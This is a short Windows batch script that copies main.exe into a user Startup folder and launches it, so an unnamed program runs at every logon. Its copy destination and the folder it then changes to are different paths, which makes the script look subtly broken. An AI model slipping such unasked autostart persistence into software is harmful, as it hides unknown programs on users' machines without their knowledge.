@echo off

copy "%CD%/main.exe" "%USERPROFILE%\Start Menu\Programs\Startup"
cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
start main